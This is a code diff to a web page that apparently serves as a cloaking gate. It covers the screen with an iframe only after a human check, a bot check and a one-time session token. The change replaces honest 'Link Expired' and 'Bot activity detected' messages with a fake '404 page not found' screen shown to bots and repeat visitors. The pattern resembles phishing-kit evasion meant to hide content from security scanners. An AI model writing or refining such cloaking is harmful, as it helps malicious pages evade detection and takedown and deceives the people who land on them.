@@ -26,6 +26,32 @@
     .spinner { width:16px; height:16px; border-radius:50%; border:3px solid #40739e; border-top-color:transparent; animation:spin 0.6s linear infinite; }
     #badge { font-size:10px; color:#888; margin-top:18px; text-align:right; opacity:0.7; }
     iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
+
+    /* Classic Error 404 style */
+    .error-404 {
+        display:flex;
+        flex-direction:column;
+        justify-content:center;
+        align-items:center;
+        width:100%;
+        height:100vh;
+        text-align:center;
+        font-family:Arial, sans-serif;
+        color:#333;
+        background:#f8f8f8;
+    }
+    .error-404 h1 {
+        font-size:96px;
+        margin:0;
+    }
+    .error-404 h2 {
+        font-size:32px;
+        margin:0;
+    }
+    .error-404 p {
+        font-size:18px;
+        color:#555;
+    }
 </style>
 </head>
 <body>
@@ -53,8 +79,10 @@ const ONE_TIME_KEY = "one_time_blob_token";
 // One-time session check
 if (sessionStorage.getItem(ONE_TIME_KEY)) {
     document.body.innerHTML = `
-        <div style="width:100%; height:100vh; display:flex; align-items:center; justify-content:center; font-family:Arial; color:#333;">
-            <div><h2>Link Expired</h2><p>This link can only be used once per session.</p></div>
+        <div class="error-404">
+            <h1>404</h1>
+            <h2>Error</h2>
+            <p>The requested page could not be found.</p>
         </div>`;
     throw new Error("One-time link already used.");
 }
@@ -99,16 +127,20 @@ function isBot() {
     return false; // allow human verification to override bot check
 }
 
-function showFakePage() {
-    document.body.innerHTML = `<div style="width:100%; height:100vh; display:flex; align-items:center; justify-content:center;">
-        <div><h2>Access Denied</h2><p>Bot activity detected.</p></div></div>`;
+function showError404() {
+    document.body.innerHTML = `
+        <div class="error-404">
+            <h1>404</h1>
+            <h2>Error</h2>
+            <p>The requested page could not be found.</p>
+        </div>`;
 }
 
 // MAIN
 document.addEventListener("DOMContentLoaded", async () => {
     await requireVerification(); // user confirms they are human
 
-    if(isBot()) return showFakePage(); // now run bot detection
+    if(isBot()) return showError404(); // bot detection
 
     // One-time token
     const token = crypto.randomUUID();
